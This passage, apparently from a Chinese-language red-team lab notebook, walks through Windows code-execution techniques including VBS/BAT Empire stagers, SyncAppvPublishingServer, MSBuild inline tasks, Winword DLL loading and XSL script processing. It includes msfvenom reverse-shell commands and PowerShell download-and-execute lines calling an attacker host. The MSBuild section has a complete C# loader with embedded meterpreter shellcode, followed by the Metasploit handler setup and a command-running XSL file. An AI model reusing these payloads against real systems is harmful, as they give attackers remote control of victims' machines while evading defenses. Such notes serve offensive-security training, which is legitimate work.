height="3.277083333333333in"}
## Scripting(脚本执行)
1.  vbs
环境： 攻击机：Kali（10.100.18.20） 被攻击机：Windows 2012 R2
（10.100.18.22）安装Python2.7（或者将py 文件打包成exe 格式可以免杀）
攻击手法： vbs 生成vbs 代码
![](media/image79.jpeg){width="4.610149825021872in"
height="3.5520833333333335in"}
![](media/image80.jpeg){width="5.882767935258093in"
height="1.0908333333333333in"}![](media/image81.jpeg){width="5.879970472440945in"
height="1.3658333333333332in"}![](media/image82.jpeg){width="5.875132327209099in"
height="1.58125in"}
Bat 生成bat 批处理文件
![](media/image83.jpeg){width="5.043902012248469in"
height="3.2954166666666667in"}
目标主机执行
![](media/image84.jpeg){width="5.889336176727909in"
height="1.0954166666666667in"}
Empire 成功获取agent
![](media/image85.jpeg){width="5.8759361329833775in"
height="1.4941655730533683in"}
执行系统命令
![](media/image86.jpeg){width="5.871458880139983in"
height="1.283332239720035in"}
2.  jscript
    https://gist.github.com/homjxi0e/0d683007bd4a3ce39d3e19342aaa68ec
![](media/image87.jpeg){width="4.375623359580053in"
height="3.006666666666667in"}
## SyncAppvPublishingServer
环境： Kali: 10.100.19.19 Win10 : 10.100.0.200
攻击手法：
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.19.19
> LPORT=4
>
> 444 -f psh-reflection \>4444.ps1
>
> 2、SyncAppvPublishingServer.exe \"n;((New-Object
> Net.WebClient).DownloadString(\'
> [http://10.100.19.19/4444.ps1\');4444.ps1](http://10.100.19.19/4444.ps1%27)%3B4444.ps1)
> \| IEX\"
>
> powershell -windowstyle hidden -exec bypass -c \"IEX (New-Object
> Net.WebClient).
> DownloadString(\'[http://10.100.19.19/4444.ps1\');4444.ps1](http://10.100.19.19/4444.ps1%27)%3B4444.ps1)\"
未复现成功
## Trusted Developer Utilities（值得信赖的开发者工具）
环境： Kali: 10.100.19.19 Win7 : 10.100.0.25
攻击手法： 工具地址： MSBuild https://github.com/3gstudent/msbuild-
inline-task.git
1、使用Msfvenom 生成shellcode,替换入exec64.xml 文件中。
> msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.100.19.19
> lport=4444
>
> -f csharp
>
> \ xmlns=\" uild/2003\"\>
>
> \
>
> \ C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe
> SimpleTa sks.csproj \--\>
>
> \
>
> \
>
> \
>
> \
>
> \
>
> \
>
> \
> AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Buil
> d.Tasks.v4.0.dll\" \>
>
> \
>
> \
>
> \
> using System;
>
> using System.Runtime.InteropServices; using Microsoft.Build.Framework;
> using Microsoft.Build.Utilities;
>
> public class ClassExample : Task, ITask
>
> {
>
> private static UInt32 MEM_COMMIT = 0x1000;
>
> private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
> \[DllImport(\"kernel32\")\]
>
> private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32
> size, UInt32 flAllocationType, UInt32 flProtect);
> \[DllImport(\"kernel32\")\]
>
> private static extern IntPtr CreateThread( UInt32 lpThreadAttributes,
>
> UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param,
>
> UInt32 dwCreationFlags, ref UInt32 lpThreadId
>
> );
>
> \[DllImport(\"kernel32\")\]
>
> private static extern UInt32 WaitForSingleObject( IntPtr hHandle,
>
> UInt32 dwMilliseconds
>
> );
>
> public override bool Execute()
>
> {
>
> byte\[\] shellcode = new byte\[510\] {
> 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
>
> 0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
>
> 0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
> 0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
> 0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
>
> 0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
>
> 0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,
>
> 0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,
>
> 0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,
> 0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
>
> 0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
>
> 0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
>
> 0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
>
> 0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
> 0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,
> 0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,
>
> 0x49,0xbc,0x02,0x00,0x11,0x5c,0x0a,0x64,0x13,0x13,0x41,0x54,0x49,0x89,0xe4,
>
> 0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
> 0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,
> 0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,
> 0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,
> 0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,
>
> 0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5,
> 0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,
>
> 0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,
> 0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,
>
> 0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,
>
> 0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,
> 0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,
> 0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,
>
> 0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5,
> 0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,
> 0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,
>
> 0xff,0xe7,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
> };
>
> UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
> MEM_COMMIT, PAGE_EXECUTE_READWRITE);
>
> Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
> IntPtr hThread = IntPtr.Zero;
>
> UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero;
>
> hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
> WaitForSingleObject(hThread, 0xFFFFFFFF);
>
> return true;
>
> }
>
> }
>
> \]\]\>
>
> \
>
> \
>
> \
>
> \
2、msf 设置
> use exploit/multi/handler
>
> msf exploit(multi/handler) \> set payload
> windows/x64/meterpreter/reverse_tcp msf exploit(multi/handler) \> set
> lhost 10.100.19.19
>
> msf exploit(multi/handler) \> set lport 4444 msf
> exploit(multi/handler) \> exploit
3、通过MSBuild 运行才能获得Meterpreter
会话。C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe
exec64.xml
![](media/image88.jpeg){width="5.878252405949256in" height="3.1625in"}
## Winword
环境： Kali: 10.100.19.19 Win7 : 10.100.0.25，office2013 攻击手法：
利用Office word 的/l 参数来加载dll 文件winword.exe /l dllfile.dll
使用kali 制作dll
本地执行加载payload
（未反弹shell，复现失败）
## XSL Script Processing（XSL 脚本处理）
环境： Kali: 10.100.19.19 Win7 : 10.100.0.25
攻击手法： 1、在kali 制作两个文件，开启Python3 -m http.server 80
customers.xml
> \
>
> \
>
> \
>
> \
>
> \Microsoft\
>
> \
>
> \
script.xsl
> \
>
> \ xmlns:xsl=\"\"
> xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\"
> xmlns:user=\"\"\>
>
> \
> function xml(nodelist) {
>
> var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd.exe /k
> calc.exe\"); return nodelist.nextNode().xml;
>
> }
>
> \
>
> \
>
> \
>
> \
>
> \